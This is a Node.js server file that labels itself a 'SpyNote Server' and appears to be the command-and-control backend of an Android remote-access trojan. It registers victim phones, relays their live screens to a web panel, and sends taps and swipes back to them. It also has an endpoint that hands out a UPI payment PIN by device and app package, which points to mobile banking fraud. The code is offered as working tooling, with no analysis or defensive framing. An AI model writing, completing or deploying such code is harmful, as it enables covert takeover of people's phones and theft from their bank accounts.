const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '50mb' }));

// =====================
// DEVICE STORAGE
// =====================
const devices = new Map();

// =====================
// DEVICE REGISTER API
// =====================
app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;

    if (deviceId) {
        devices.set(deviceId, {
            model,
            brand,
            version,
            status,
            connected: true
        });

        console.log("✅ Device registered:", deviceId);
        io.emit('devices-update', Array.from(devices.entries()));
    }

    res.json({ success: true });
});

// =====================
// GET DEVICES
// =====================
app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

// =====================
// ✅ UPI PIN API (ADDED)
// =====================
app.get('/api/upi-pin', (req, res) => {
    const { deviceid, package: packageName, action } = req.query;

    if (!deviceid || !packageName) {
        return res.status(400).json({
            action: false,
            error: 'Missing deviceid or package'
        });
    }

    console.log('🔐 UPI PIN Request:', {
        deviceid,
        packageName,
        action
    });

    if (action === 'true') {
        // ⚠️ DEMO PIN (Production me DB ya secure vault use karo)
        return res.json({
            action: true,
            pin: "4525"
        });
    }

    res.json({ action: false });
});

// =====================
// SOCKET.IO
// =====================
io.on('connection', (socket) => {
    console.log('🔌 New connection:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;

        if (deviceId) {
            devices.set(deviceId, {
                ...deviceInfo,
                connected: true,
                socketId: socket.id
            });

            socket.join(deviceId);
            console.log("📱 Device joined room:", deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    // 📺 Screen frame relay (phone → web)
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;

        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('screen-update', data);
            console.log('📺 Frame relayed:', deviceId);
        }
    });

    // 🎮 Control relay (web → phone)
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;

        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action,
                x: parseFloat(x) || 0,
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0,
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0,
                endY: parseFloat(endY) || 0
            });

            console.log('🎮 Control sent:', action, 'to', deviceId);
        }
    });

    // ❌ Disconnect handling
    socket.on('disconnect', () => {
        console.log('🔌 Disconnected:', socket.id);

        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, {
                    ...info,
                    connected: false
                });

                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device disconnected:', deviceId);
                break;
            }
        }
    });
});

// =====================
// SERVER START
// =====================
const PORT = process.env.PORT || 3000;

server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server running on port ${PORT}`);
    console.log(`🌐 Web panel: http://localhost:${PORT}`);
    console.log(`📱 Ready for devices!`);
});
